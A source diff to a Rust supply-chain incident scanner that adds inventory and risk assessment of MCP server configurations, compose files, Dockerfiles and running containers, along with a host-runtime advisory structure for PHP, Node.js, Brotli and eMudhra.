@@ -19,9 +19,36 @@ use walkdir::{DirEntry, WalkDir};
 const MAX_TEXT_FILE_BYTES: u64 = 5 * 1024 * 1024;
 const MAX_RECORDED_LIMITATION_ITEMS: usize = 100;
 const BUNDLED_PYPI_SKILL_MD: &str = include_str!("../bundled/pypi-supply-chain-response/SKILL.md");
-const BUNDLED_PYPI_IOC_PATTERNS_MD: &str = include_str!("../bundled/pypi-supply-chain-response/references/ioc-patterns.md");
+const BUNDLED_PYPI_IOC_PATTERNS_MD: &str =
+    include_str!("../bundled/pypi-supply-chain-response/references/ioc-patterns.md");
 const BUNDLED_NPM_SKILL_MD: &str = include_str!("../bundled/npm-supply-chain-response/SKILL.md");
-const BUNDLED_NPM_IOC_PATTERNS_MD: &str = include_str!("../bundled/npm-supply-chain-response/references/ioc-patterns.md");
+const BUNDLED_NPM_IOC_PATTERNS_MD: &str =
+    include_str!("../bundled/npm-supply-chain-response/references/ioc-patterns.md");
+const BUNDLED_MCP_SKILL_MD: &str = include_str!("../bundled/mcp-supply-chain-response/SKILL.md");
+const BUNDLED_MCP_IOC_PATTERNS_MD: &str =
+    include_str!("../bundled/mcp-supply-chain-response/references/ioc-patterns.md");
+const BUNDLED_HOST_RUNTIME_SKILL_MD: &str =
+    include_str!("../bundled/host-runtime-response/SKILL.md");
+const BUNDLED_HOST_RUNTIME_IOC_PATTERNS_MD: &str =
+    include_str!("../bundled/host-runtime-response/references/ioc-patterns.md");
+
+/// Fixed-version tables and detection hints for host runtime advisories
+/// (PHP, Node.js, Brotli, eMudhra emSign CA compromise, October 2026 wave).
+#[derive(Debug, Clone)]
+struct HostAdvisory {
+    /// Which collector to run: "php", "node", "brotli", or "emudhra".
+    kind: &'static str,
+    /// (release-line prefix, first fixed version on that line). A version on a
+    /// line below every listed prefix is treated as vulnerable-and-unfixed
+    /// (EOL), matching the upstream advisories.
+    fixed_by_line: &'static [(&'static str, &'static str)],
+    /// Component name to show in findings.
+    component: &'static str,
+    /// Whether a version older than every listed line is vulnerable (PHP/Node
+    /// EOL lines are always affected; Brotli below 1.0.3 is not in the advisory
+    /// range, so it is reported as "verify" instead).
+    older_lines_vulnerable: bool,
+}
 
 #[derive(Parser, Debug)]
 #[command(name = "scira")]
@@ -42,7 +69,8 @@ enum Commands {
 
 #[derive(Args, Debug)]
 struct ScanArgs {
-    /// Bundled incident identifier. Current built-ins: litellm, axios
+    /// Bundled incident identifier. Current built-ins: litellm, axios, mcp-stdio,
+    /// php, node, brotli, emudhra
     incident: String,
 
     /// Scan this target path. Defaults to the current directory.
@@ -122,6 +150,7 @@ struct IncidentProfile {
     source_version: &'static str,
     bundled_skill_md: &'static str,
     bundled_ioc_patterns_md: &'static str,
+    host_advisory: Option<HostAdvisory>,
 }
 
 #[derive(Debug, Serialize, Deserialize)]
@@ -184,6 +213,10 @@ struct Findings {
     environment_hits: Vec<EnvironmentFinding>,
     cache_hits: Vec<CacheHit>,
     skipped_checks: Vec<SkippedCheck>,
+    #[serde(default, skip_serializing_if = "Vec::is_empty")]
+    mcp_inventory: Vec<McpServerFinding>,
+    #[serde(default, skip_serializing_if = "Vec::is_empty")]
+    mcp_risk_hits: Vec<McpRiskHit>,
 }
 
 #[derive(Debug, Serialize, Deserialize)]
@@ -248,6 +281,51 @@ struct CacheHit {
 struct SkippedCheck {
     check: String,
     reason: String,
+}
+
+#[derive(Debug, Serialize, Deserialize)]
+struct McpServerFinding {
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    source_kind: Option<String>,
+    client_hint: String,
+    source_path: String,
+    server_name: String,
+    transport: String,
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    service_name: Option<String>,
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    container_name: Option<String>,
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    image: Option<String>,
+    command: Option<String>,
+    args: Vec<String>,
+    env_keys: Vec<String>,
+    #[serde(default, skip_serializing_if = "Vec::is_empty")]
+    mounts: Vec<String>,
+    #[serde(default, skip_serializing_if = "Vec::is_empty")]
+    ports: Vec<String>,
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    runtime_state: Option<String>,
+    url: Option<String>,
+    raw_config_excerpt: String,
+}
+
+#[derive(Debug, Copy, Clone, Serialize, Deserialize, PartialEq, Eq)]
+#[serde(rename_all = "snake_case")]
+enum McpRiskSeverity {
+    High,
+    Medium,
+    Low,
+}
+
+#[derive(Debug, Serialize, Deserialize)]
+struct McpRiskHit {
+    severity: McpRiskSeverity,
+    category: String,
+    server_name: String,
+    source_path: String,
+    evidence: String,
+    recommendation: String,
 }
 
 #[derive(Debug, Serialize, Deserialize)]
@@ -327,7 +405,8 @@ fn real_main() -> Result<i32> {
 
 fn run_scan_command(args: ScanArgs) -> Result<i32> {
     let profile = incident_profile(&args.incident)?;
-    let interactive = !args.non_interactive && io::stdin().is_terminal() && io::stdout().is_terminal();
+    let interactive =
+        !args.non_interactive && io::stdin().is_terminal() && io::stdout().is_terminal();
     let llm_config = detect_llm_config()?;
 
     let target = if args.all_dirs {
@@ -343,7 +422,13 @@ fn run_scan_command(args: ScanArgs) -> Result<i32> {
         ensure_target_is_accessible(&target)?;
     }
 
-    let report = perform_scan(&profile, &target, args.all_dirs, interactive, llm_config.is_some())?;
+    let report = perform_scan(
+        &profile,
+        &target,
+        args.all_dirs,
+        interactive,
+        llm_config.is_some(),
+    )?;
     let rendered = match args.format {
         OutputFormat::Json => serde_json::to_string_pretty(&report)?,
         OutputFormat::Text => render_scan_report_text(&report, args.verbose),
@@ -357,7 +442,10 @@ fn run_scan_command(args: ScanArgs) -> Result<i32> {
         println!("\n{}", render_explain_text(&output));
     } else if !args.no_explain && args.format == OutputFormat::Text && interactive {
         if let Some(config) = llm_config {
-            if prompt_yes_no("\nScan complete. Would you like an AI explanation and remediation summary? [Y/n] ", true)? {
+            if prompt_yes_no(
+                "\nScan complete. Would you like an AI explanation and remediation summary? [Y/n] ",
+                true,
+            )? {
                 let output = explain_report(&profile, &report, &config)?;
                 println!("\n{}", render_explain_text(&output));
             }
@@ -410,17 +498,35 @@ fn perform_scan(
         environment_hits: Vec::new(),
         cache_hits: Vec::new(),
         skipped_checks: Vec::new(),
+        mcp_inventory: Vec::new(),
+        mcp_risk_hits: Vec::new(),
     };
 
-    let matcher = build_matcher(profile.search_patterns)?;
-    let candidate_files = collect_candidate_files(target, &matcher, &mut limitations)?;
-    scan_candidate_files(profile, target, &candidate_files, &mut findings, &mut limitations)?;
+    if profile.ecosystem == "mcp" {
+        scan_mcp_stdio_configs(target, &mut findings, &mut limitations)?;
+    } else if let Some(advisory) = &profile.host_advisory {
+        scan_host_runtime(advisory, &mut findings, &mut limitations)?;
+    } else {
+        let matcher = build_matcher(profile.search_patterns)?;
+        let candidate_files = collect_candidate_files(target, &matcher, &mut limitations)?;
+        scan_candidate_files(
+            profile,
+            target,
+            &candidate_files,
+            &mut findings,
+            &mut limitations,
+        )?;
 
-    let environment_scan = scan_environment(profile, target, &mut limitations)?;
-    findings.environment_hits.extend(environment_scan.findings);
-    findings.cache_hits.extend(environment_scan.cache_hits);
-    findings.ioc_file_hits.extend(environment_scan.ioc_file_hits);
-    findings.skipped_checks.extend(environment_scan.skipped_checks);
+        let environment_scan = scan_environment(profile, target, &mut limitations)?;
+        findings.environment_hits.extend(environment_scan.findings);
+        findings.cache_hits.extend(environment_scan.cache_hits);
+        findings
+            .ioc_file_hits
+            .extend(environment_scan.ioc_file_hits);
+        findings
+            .skipped_checks
+            .extend(environment_scan.skipped_checks);
+    }
 
     let summary = build_summary(&findings, &limitations);
     let actions = build_actions(profile, &summary, &limitations);
@@ -503,7 +609,10 @@ fn scan_candidate_files(
             }
         };
 
-        let file_name = file.file_name().and_then(|n| n.to_str()).unwrap_or_default();
+        let file_name = file
+            .file_name()
+            .and_then(|n| n.to_str())
+            .unwrap_or_default();
         match file_name {
             "package.json" => parse_package_json(profile, file, &content, findings),
             "package-lock.json" => parse_package_lock_json(profile, file, &content, findings),
@@ -562,12 +671,22 @@ fn scan_candidate_files(
     Ok(())
 }
 
-fn parse_package_json(profile: &IncidentProfile, file: &Path, content: &str, findings: &mut Findings) {
+fn parse_package_json(
+    profile: &IncidentProfile,
+    file: &Path,
+    content: &str,
+    findings: &mut Findings,
+) {
     let Ok(json) = serde_json::from_str::<Value>(content) else {
         return;
     };
 
-    for section in ["dependencies", "devDependencies", "optionalDependencies", "peerDependencies"] {
+    for section in [
+        "dependencies",
+        "devDependencies",
+        "optionalDependencies",
+        "peerDependencies",
+    ] {
         if let Some(deps) = json.get(section).and_then(|v| v.as_object()) {
             for name in profile.related_package_names {
                 if let Some(version) = deps.get(*name).and_then(|v| v.as_str()) {
@@ -602,7 +721,12 @@ fn parse_package_json(profile: &IncidentProfile, file: &Path, content: &str, fin
     }
 }
 
-fn parse_package_lock_json(profile: &IncidentProfile, file: &Path, content: &str, findings: &mut Findings) {
+fn parse_package_lock_json(
+    profile: &IncidentProfile,
+    file: &Path,
+    content: &str,
+    findings: &mut Findings,
+) {
     let Ok(json) = serde_json::from_str::<Value>(content) else {
         return;
     };
@@ -611,7 +735,9 @@ fn parse_package_lock_json(profile: &IncidentProfile, file: &Path, content: &str
         for (package_path, package_meta) in packages {
             for name in profile.related_package_names {
                 let node_module_suffix = format!("node_modules/{name}");
-                if package_path == &node_module_suffix || package_path.ends_with(&format!("/{node_module_suffix}")) {
+                if package_path == &node_module_suffix
+                    || package_path.ends_with(&format!("/{node_module_suffix}"))
+                {
                     let version = package_meta
                         .get("version")
                         .and_then(|v| v.as_str())
@@ -651,8 +777,15 @@ fn collect_package_lock_dependencies(
         let mut chain = parent_chain.clone();
         chain.push(name.clone());
 
-        if profile.related_package_names.iter().any(|n| *n == name.as_str()) {
-            let version = meta.get("version").and_then(|v| v.as_str()).unwrap_or("unknown");
+        if profile
+            .related_package_names
+            .iter()
+            .any(|n| *n == name.as_str())
+        {
+            let version = meta
+                .get("version")
+                .and_then(|v| v.as_str())
+                .unwrap_or("unknown");
             findings.manifest_hits.push(ManifestHit {
                 path: file.display().to_string(),
                 line_number: 0,
@@ -675,7 +808,11 @@ fn collect_package_lock_dependencies(
     }
 }
 
-fn scan_environment(profile: &IncidentProfile, target: &Path, limitations: &mut Limitations) -> Result<PythonEnvScan> {
+fn scan_environment(
+    profile: &IncidentProfile,
+    target: &Path,
+    limitations: &mut Limitations,
+) -> Result<PythonEnvScan> {
     match profile.ecosystem {
         "python" => scan_python_environment(profile, limitations),
         "npm" => scan_npm_environment(profile, target, limitations),
@@ -683,7 +820,10 @@ fn scan_environment(profile: &IncidentProfile, target: &Path, limitations: &mut 
     }
 }
 
-fn scan_python_environment(profile: &IncidentProfile, limitations: &mut Limitations) -> Result<PythonEnvScan> {
+fn scan_python_environment(
+    profile: &IncidentProfile,
+    limitations: &mut Limitations,
+) -> Result<PythonEnvScan> {
     let mut result = PythonEnvScan::default();
     let python = detect_python();
 
@@ -700,7 +840,8 @@ fn scan_python_environment(profile: &IncidentProfile, limitations: &mut Limitati
     match pip_show {
         Ok(output) if output.status.success() && !output.stdout.trim().is_empty() => {
             let version = parse_pip_show_field(&output.stdout, "Version");
-            let location = parse_pip_show_field(&output.stdout, "Location").unwrap_or_else(|| "unknown".to_string());
+            let location = parse_pip_show_field(&output.stdout, "Location")
+                .unwrap_or_else(|| "unknown".to_string());
             result.findings.push(EnvironmentFinding {
                 check: "pip_show".to_string(),
                 status: "present".to_string(),
@@ -730,7 +871,11 @@ fn scan_python_environment(profile: &IncidentProfile, limitations: &mut Limitati
                 details: "Package not found via pip show".to_string(),
                 version: None,
                 bad_version: false,
-                raw: if output.stderr.trim().is_empty() { None } else { Some(output.stderr) },
+                raw: if output.stderr.trim().is_empty() {
+                    None
+                } else {
+                    Some(output.stderr)
+                },
             });
         }
         Err(err) => {
@@ -748,7 +893,10 @@ fn scan_python_environment(profile: &IncidentProfile, limitations: &mut Limitati
         Ok(output) if output.status.success() => {
             let mut matched = false;
             for line in output.stdout.lines() {
-                if line.to_lowercase().starts_with(&format!("{}==", profile.package.to_lowercase())) {
+                if line
+                    .to_lowercase()
+                    .starts_with(&format!("{}==", profile.package.to_lowercase()))
+                {
                     matched = true;
                     let version = line.split("==").nth(1).map(|s| s.trim().to_string());
                     result.findings.push(EnvironmentFinding {
@@ -787,12 +935,21 @@ fn scan_python_environment(profile: &IncidentProfile, limitations: &mut Limitati
 
     match run_command_capture(&python, &["-m", "pip", "inspect"]) {
         Ok(output) if output.status.success() => {
-            let contains_package = output.stdout.to_lowercase().contains(&format!("\"name\": \"{}\"", profile.package.to_lowercase()));
+            let contains_package = output
+                .stdout
+                .to_lowercase()
+                .contains(&format!("\"name\": \"{}\"", profile.package.to_lowercase()));
             result.findings.push(EnvironmentFinding {
                 check: "pip_inspect".to_string(),
-                status: if contains_package { "present" } else { "completed" }.to_string(),
+                status: if contains_package {
+                    "present"
+                } else {
+                    "completed"
+                }
+                .to_string(),
                 details: if contains_package {
-                    "Package appears in pip inspect output; review for dependency chain details".to_string()
+                    "Package appears in pip inspect output; review for dependency chain details"
+                        .to_string()
                 } else {
                     "pip inspect completed; package not clearly present in output".to_string()
                 },
@@ -860,13 +1017,24 @@ fn scan_python_environment(profile: &IncidentProfile, limitations: &mut Limitati
         }
     }
 
-    result.cache_hits.extend(scan_cache_hits(profile.package, &env_paths, limitations)?);
-    result.ioc_file_hits.extend(search_ioc_files(&env_paths, profile.ioc_files, limitations, true)?);
+    result
+        .cache_hits
+        .extend(scan_cache_hits(profile.package, &env_paths, limitations)?);
+    result.ioc_file_hits.extend(search_ioc_files(
+        &env_paths,
+        profile.ioc_files,
+        limitations,
+        true,
+    )?);
 
     Ok(result)
 }
 
-fn scan_npm_environment(profile: &IncidentProfile, target: &Path, limitations: &mut Limitations) -> Result<PythonEnvScan> {
+fn scan_npm_environment(
+    profile: &IncidentProfile,
+    target: &Path,
+    limitations: &mut Limitations,
+) -> Result<PythonEnvScan> {
     let mut result = PythonEnvScan::default();
 
     if !command_exists("npm") {
@@ -887,18 +1055,35 @@ fn scan_npm_environment(profile: &IncidentProfile, target: &Path, limitations: &
     if target_has_node_context {
         collect_npm_ls_findings(profile, target, false, &mut result);
         if let Some(dep) = profile.malicious_dependency {
-            collect_npm_dependency_findings(profile, target, dep, "npm_ls_malicious_dep", false, &mut result);
+            collect_npm_dependency_findings(
+                profile,
+                target,
+                dep,
+                "npm_ls_malicious_dep",
+                false,
+                &mut result,
+            );
         }
     } else {
         result.skipped_checks.push(SkippedCheck {
             check: "npm_ls".to_string(),
-            reason: format!("target {} does not look like a Node/npm project", target.display()),
+            reason: format!(
+                "target {} does not look like a Node/npm project",
+                target.display()
+            ),
         });
     }
 
     collect_npm_ls_findings(profile, Path::new("/"), true, &mut result);
     if let Some(dep) = profile.malicious_dependency {
-        collect_npm_dependency_findings(profile, Path::new("/"), dep, "npm_ls_global_malicious_dep", true, &mut result);
+        collect_npm_dependency_findings(
+            profile,
+            Path::new("/"),
+            dep,
+            "npm_ls_global_malicious_dep",
+            true,
+            &mut result,
+        );
     }
 
     let mut env_paths = Vec::new();
@@ -908,27 +1093,2176 @@ fn scan_npm_environment(profile: &IncidentProfile, target: &Path, limitations: &
         env_paths.push(home.join(".npm"));
     }
 
-    result.cache_hits.extend(scan_cache_hits(profile.package, &env_paths, limitations)?);
+    result
+        .cache_hits
+        .extend(scan_cache_hits(profile.package, &env_paths, limitations)?);
     if let Some(dep) = profile.malicious_dependency {
-        result.cache_hits.extend(scan_cache_hits(dep, &env_paths, limitations)?);
+        result
+            .cache_hits
+            .extend(scan_cache_hits(dep, &env_paths, limitations)?);
     }
-    result.ioc_file_hits.extend(search_ioc_files(&env_paths, profile.ioc_files, limitations, true)?);
+    result.ioc_file_hits.extend(search_ioc_files(
+        &env_paths,
+        profile.ioc_files,
+        limitations,
+        true,
+    )?);
 
     Ok(result)
 }
 
+fn scan_mcp_stdio_configs(
+    target: &Path,
+    findings: &mut Findings,
+    limitations: &mut Limitations,
+) -> Result<()> {
+    let matcher = build_matcher(&[
+        ".mcp.json",
+        "mcp.json",
+        ".vscode/mcp.json",
+        "claude_desktop_config.json",
+        "mcp_config.json",
+        "Dockerfile",
+        "docker-compose.yml",
+        "docker-compose.yaml",
+        "compose.yml",
+        "compose.yaml",
+        ".env",
+        ".env.example",
+    ])?;
+    let mut candidate_files = collect_candidate_files(target, &matcher, limitations)?;
+    candidate_files.extend(
+        known_mcp_config_paths(target)
+            .into_iter()
+            .filter(|path| path.exists()),
+    );
+    candidate_files = dedupe_paths(&candidate_files);
+
+    for file in candidate_files {
+        scan_mcp_candidate_file(&file, target, findings, limitations)?;
+    }
+
+    scan_docker_runtime(findings);
+
+    Ok(())
+}
+
+fn scan_mcp_candidate_file(
+    file: &Path,
+    target: &Path,
+    findings: &mut Findings,
+    limitations: &mut Limitations,
+) -> Result<()> {
+    let content = match fs::read_to_string(file) {
+        Ok(content) => content,
+        Err(err) if err.kind() == io::ErrorKind::PermissionDenied => {
+            push_limited(
+                &mut limitations.permission_denied_paths,
+                file.display().to_string(),
+            );
+            return Ok(());
+        }
+        Err(err) => {
+            push_limited(
+                &mut limitations.not_inspected,
+                format!("{} ({err})", file.display()),
+            );
+            return Ok(());
+        }
+    };
+
+    if is_compose_file(file) {
+        scan_compose_file(file, target, &content, findings, limitations);
+    } else if is_dockerfile(file) {
+        scan_dockerfile(file, target, &content, findings);
+    } else if is_mcp_json_candidate(file) {
+        scan_mcp_json_config(file, target, &content, findings, limitations);
+    }
+    Ok(())
+}
+
+fn known_mcp_config_paths(target: &Path) -> Vec<PathBuf> {
+    vec![
+        target.join(".config/Claude/claude_desktop_config.json"),
+        target.join("Library/Application Support/Claude/claude_desktop_config.json"),
+        target.join("AppData/Roaming/Claude/claude_desktop_config.json"),
+        target.join(".vscode/mcp.json"),
+        target.join(".mcp.json"),
+    ]
+}
+
+fn is_mcp_json_candidate(path: &Path) -> bool {
+    let name = path
+        .file_name()
+        .and_then(|value| value.to_str())
+        .unwrap_or_default();
+    matches!(
+        name,
+        ".mcp.json" | "mcp.json" | "claude_desktop_config.json" | "mcp_config.json"
+    )
+}
+
+fn is_compose_file(path: &Path) -> bool {
+    let name = path
+        .file_name()
+        .and_then(|value| value.to_str())
+        .unwrap_or_default();
+    matches!(
+        name,
+        "docker-compose.yml" | "docker-compose.yaml" | "compose.yml" | "compose.yaml"
+    )
+}
+
+fn is_dockerfile(path: &Path) -> bool {
+    path.file_name()
+        .and_then(|value| value.to_str())
+        .map(|name| name == "Dockerfile")
+        .unwrap_or(false)
+}
+
+fn scan_mcp_json_config(
+    file: &Path,
+    target: &Path,
+    content: &str,
+    findings: &mut Findings,
+    limitations: &mut Limitations,
+) {
+    let json = match serde_json::from_str::<Value>(content) {
+        Ok(json) => json,
+        Err(err) => {
+            push_limited(
+                &mut limitations.not_inspected,
+                format!("{} (invalid JSON: {err})", file.display()),
+            );
+            return;
+        }
+    };
+
+    for server in extract_mcp_servers_from_config(file, &json) {
+        record_mcp_server(server, target, findings);
+    }
+}
+
+fn scan_compose_file(
+    file: &Path,
+    target: &Path,
+    content: &str,
+    findings: &mut Findings,
+    limitations: &mut Limitations,
+) {
+    let compose = match serde_yaml::from_str::<Value>(content) {
+        Ok(compose) => compose,
+        Err(err) => {
+            push_limited(
+                &mut limitations.not_inspected,
+                format!("{} (invalid compose YAML: {err})", file.display()),
+            );
+            return;
+        }
+    };
+
+    let Some(services) = compose.get("services").and_then(|value| value.as_object()) else {
+        return;
+    };
+
+    for (service_name, service) in services {
+        let image = string_field(service, "image");
+        let (command, args) = command_args_from_service(service);
+        let env_keys = env_keys_from_value(service.get("environment"));
+        let mounts = compose_mounts_from_service(service);
+        let ports = strings_from_value(service.get("ports"));
+        let labels = label_strings_from_value(service.get("labels"));
+        let extras = compose_extra_refs(service);
+        let raw = redacted_config_excerpt(service, 500);
+
+        if !is_mcp_or_sensitive_surface(
+            &[
+                service_name.clone(),
+                image.clone().unwrap_or_default(),
+                command.clone().unwrap_or_default(),
+                args.join(" "),
+                env_keys.join(" "),
+                mounts.join(" "),
+                ports.join(" "),
+                labels.join(" "),
+                extras.join(" "),
+                raw.clone(),
+            ],
+            &mounts,
+        ) {
+            continue;
+        }
+
+        let server = McpServerFinding {
+            source_kind: Some("compose_service".to_string()),
+            client_hint: "docker_compose".to_string(),
+            source_path: file.display().to_string(),
+            server_name: service_name.clone(),
+            transport: "container".to_string(),
+            service_name: Some(service_name.clone()),
+            container_name: string_field(service, "container_name"),
+            image,
+            command,
+            args,
+            env_keys,
+            mounts,
+            ports,
+            runtime_state: None,
+            url: None,
+            raw_config_excerpt: raw,
+        };
+        record_mcp_server(server, target, findings);
+    }
+}
+
+fn scan_dockerfile(file: &Path, target: &Path, content: &str, findings: &mut Findings) {
+    let mut image = None;
+    let mut command = None;
+    let mut args = Vec::new();
+    let mut env_keys = Vec::new();
+    let mut mounts = Vec::new();
+    let mut ports = Vec::new();
+
+    for line in content.lines() {
+        let trimmed = line.trim();
+        if trimmed.is_empty() || trimmed.starts_with('#') {
+            continue;
+        }
+        let Some((instruction, rest)) = split_dockerfile_instruction(trimmed) else {
+            continue;
+        };
+        match instruction.as_str() {
+            "FROM" => {
+                image = rest
+                    .split_whitespace()
+                    .next()
+                    .map(|value| value.to_string())
+            }
+            "CMD" | "ENTRYPOINT" => {
+                let parsed = docker_command_parts(rest);
+                if let Some(first) = parsed.first() {
+                    command = Some(first.clone());
+                    args = parsed.iter().skip(1).cloned().collect();
+                }
+            }
+            "ENV" => env_keys.extend(docker_env_keys(rest)),
+            "EXPOSE" => ports.extend(rest.split_whitespace().map(|value| value.to_string())),
+            "VOLUME" => mounts.extend(docker_volume_refs(rest)),
+            _ => {}
+        }
+    }
+    env_keys.sort();
+    env_keys.dedup();
+
+    if !is_mcp_or_sensitive_surface(
+        &[
+            image.clone().unwrap_or_default(),
+            command.clone().unwrap_or_default(),
+            args.join(" "),
+            env_keys.join(" "),
+            mounts.join(" "),
+            ports.join(" "),
+            content.to_string(),
+        ],
+        &mounts,
+    ) {
+        return;
+    }
+
+    let server = McpServerFinding {
+        source_kind: Some("dockerfile".to_string()),
+        client_hint: "dockerfile".to_string(),
+        source_path: file.display().to_string(),
+        server_name: file
+            .parent()
+            .and_then(|path| path.file_name())
+            .and_then(|name| name.to_str())
+            .unwrap_or("dockerfile")
+            .to_string(),
+        transport: "container".to_string(),
+        service_name: None,
+        container_name: None,
+        image,
+        command,
+        args,
+        env_keys,
+        mounts,
+        ports,
+        runtime_state: None,
+        url: None,
+        raw_config_excerpt: redact_dockerfile_excerpt(content, 500),
+    };
+    record_mcp_server(server, target, findings);
+}
+
+fn scan_docker_runtime(findings: &mut Findings) {
+    if !command_exists("docker") {
+        findings.skipped_checks.push(SkippedCheck {
+            check: "docker_runtime".to_string(),
+            reason: "docker was not found".to_string(),
+        });
+        return;
+    }
+
+    let ps = match run_command_capture("docker", &["ps", "-aq"]) {
+        Ok(output) if output.status.success() => output,
+        Ok(output) => {
+            findings.skipped_checks.push(SkippedCheck {
+                check: "docker_runtime".to_string(),
+                reason: stderr_or_fallback(&output.stderr, "docker ps did not succeed"),
+            });
+            return;
+        }
+        Err(err) => {
+            findings.skipped_checks.push(SkippedCheck {
+                check: "docker_runtime".to_string(),
+                reason: err.to_string(),
+            });
+            return;
+        }
+    };
+
+    let ids: Vec<&str> = ps
+        .stdout
+        .lines()
+        .map(str::trim)
+        .filter(|line| !line.is_empty())
+        .collect();
+    if ids.is_empty() {
+        return;
+    }
+
+    let mut inspect_args = vec!["inspect"];
+    inspect_args.extend(ids);
+    let inspect = match run_command_capture("docker", &inspect_args) {
+        Ok(output) if output.status.success() => output,
+        Ok(output) => {
+            findings.skipped_checks.push(SkippedCheck {
+                check: "docker_runtime".to_string(),
+                reason: stderr_or_fallback(&output.stderr, "docker inspect did not succeed"),
+            });
+            return;
+        }
+        Err(err) => {
+            findings.skipped_checks.push(SkippedCheck {
+                check: "docker_runtime".to_string(),
+                reason: err.to_string(),
+            });
+            return;
+        }
+    };
+
+    let containers = match serde_json::from_str::<Value>(&inspect.stdout) {
+        Ok(Value::Array(items)) => items,
+        Ok(_) => {
+            findings.skipped_checks.push(SkippedCheck {
+                check: "docker_runtime".to_string(),
+                reason: "docker inspect returned non-array JSON".to_string(),
+            });
+            return;
+        }
+        Err(err) => {
+            findings.skipped_checks.push(SkippedCheck {
+                check: "docker_runtime".to_string(),
+                reason: format!("docker inspect returned invalid JSON: {err}"),
+            });
+            return;
+        }
+    };
+
+    for container in containers {
+        if let Some(server) = normalize_docker_runtime_container(&container) {
+            record_mcp_server(server, Path::new("/"), findings);
+        }
+    }
+}
+
+fn normalize_docker_runtime_container(container: &Value) -> Option<McpServerFinding> {
+    let name = container
+        .get("Name")
+        .and_then(|value| value.as_str())
+        .unwrap_or("unknown")
+        .trim_start_matches('/')
+        .to_string();
+    let null = Value::Null;
+    let config = container.get("Config").unwrap_or(&null);
+    let state = container.get("State").unwrap_or(&null);
+    let network_settings = container.get("NetworkSettings").unwrap_or(&null);
+    let host_config = container.get("HostConfig").unwrap_or(&null);
+
+    let image = config
+        .get("Image")
+        .and_then(|value| value.as_str())
+        .map(|value| value.to_string())
+        .or_else(|| {
+            container
+                .get("ImageName")
+                .and_then(|value| value.as_str())
+                .map(|value| value.to_string())
+        });
+    let entrypoint = strings_from_value(config.get("Entrypoint"));
+    let cmd = strings_from_value(config.get("Cmd"));
+    let command = entrypoint.first().cloned().or_else(|| cmd.first().cloned());
+    let mut args = Vec::new();
+    if !entrypoint.is_empty() {
+        args.extend(entrypoint.iter().skip(1).cloned());
+        args.extend(cmd);
+    } else {
+        args.extend(cmd.iter().skip(1).cloned());
+    }
+    let env_keys = env_keys_from_docker_env(config.get("Env"));
+    let mounts = docker_runtime_mounts(container, host_config);
+    let ports = docker_runtime_ports(network_settings);
+    let labels = label_strings_from_value(config.get("Labels"));
+    let runtime_state = state
+        .get("Status")
+        .and_then(|value| value.as_str())
+        .map(|value| value.to_string());
+    let raw = redacted_config_excerpt(container, 500);
+
+    if !is_mcp_or_sensitive_surface(
+        &[
+            name.clone(),
+            image.clone().unwrap_or_default(),
+            command.clone().unwrap_or_default(),
+            args.join(" "),
+            env_keys.join(" "),
+            mounts.join(" "),
+            ports.join(" "),
+            labels.join(" "),
+            raw.clone(),
+        ],
+        &mounts,
+    ) {
+        return None;
+    }
+
+    Some(McpServerFinding {
+        source_kind: Some("docker_runtime".to_string()),
+        client_hint: "docker_runtime".to_string(),
+        source_path: "docker inspect".to_string(),
+        server_name: name.clone(),
+        transport: "container".to_string(),
+        service_name: labels.iter().find_map(|label| {
+            label
+                .strip_prefix("com.docker.compose.service=")
+                .map(str::to_string)
+        }),
+        container_name: Some(name),
+        image,
+        command,
+        args,
+        env_keys,
+        mounts,
+        ports,
+        runtime_state,
+        url: None,
+        raw_config_excerpt: raw,
+    })
+}
+
+fn record_mcp_server(server: McpServerFinding, target: &Path, findings: &mut Findings) {
+    let risks = assess_mcp_server_risks(&server, target);
+    findings.mcp_risk_hits.extend(risks);
+    findings.mcp_inventory.push(server);
+}
+
+fn string_field(value: &Value, field: &str) -> Option<String> {
+    value
+        .get(field)
+        .and_then(|value| value.as_str())
+        .map(|value| value.to_string())
+}
+
+fn strings_from_value(value: Option<&Value>) -> Vec<String> {
+    match value {
+        Some(Value::Array(items)) => items
+            .iter()
+            .filter_map(|item| item.as_str().map(|value| value.to_string()))
+            .collect(),
+        Some(Value::String(value)) => shell_words(value),
+        Some(Value::Number(value)) => vec![value.to_string()],
+        _ => Vec::new(),
+    }
+}
+
+fn command_args_from_service(service: &Value) -> (Option<String>, Vec<String>) {
+    let entrypoint = strings_from_value(service.get("entrypoint"));
+    let command = strings_from_value(service.get("command"));
+    if let Some(first) = entrypoint.first() {
+        let mut args = entrypoint.iter().skip(1).cloned().collect::<Vec<_>>();
+        args.extend(command);
+        (Some(first.clone()), args)
+    } else if let Some(first) = command.first() {
+        (
+            Some(first.clone()),
+            command.iter().skip(1).cloned().collect::<Vec<_>>(),
+        )
+    } else {
+        (None, Vec::new())
+    }
+}
+
+fn env_keys_from_value(value: Option<&Value>) -> Vec<String> {
+    let mut keys = match value {
+        Some(Value::Object(map)) => map.keys().cloned().collect::<Vec<_>>(),
+        Some(Value::Array(items)) => items
+            .iter()
+            .filter_map(|item| item.as_str())
+            .filter_map(|item| item.split_once('=').map(|(key, _)| key).or(Some(item)))
+            .map(|key| key.to_string())
+            .collect::<Vec<_>>(),
+        _ => Vec::new(),
+    };
+    keys.sort();
+    keys.dedup();
+    keys
+}
+
+fn env_keys_from_docker_env(value: Option<&Value>) -> Vec<String> {
+    let mut keys = match value {
+        Some(Value::Array(items)) => items
+            .iter()
+            .filter_map(|item| item.as_str())
+            .filter_map(|item| item.split_once('=').map(|(key, _)| key))
+            .map(|key| key.to_string())
+            .collect::<Vec<_>>(),
+        _ => Vec::new(),
+    };
+    keys.sort();
+    keys.dedup();
+    keys
+}
+
+fn compose_mounts_from_service(service: &Value) -> Vec<String> {
+    let mut mounts = Vec::new();
+    if let Some(volumes) = service.get("volumes").and_then(|value| value.as_array()) {
+        for volume in volumes {
+            match volume {
+                Value::String(value) => mounts.push(value.to_string()),
+                Value::Object(map) => {
+                    let source = map
+                        .get("source")
+                        .or_else(|| map.get("src"))
+                        .and_then(|value| value.as_str())
+                        .unwrap_or("");
+                    let target = map
+                        .get("target")
+                        .or_else(|| map.get("dst"))
+                        .or_else(|| map.get("destination"))
+                        .and_then(|value| value.as_str())
+                        .unwrap_or("");
+                    let read_only = map
+                        .get("read_only")
+                        .or_else(|| map.get("readonly"))
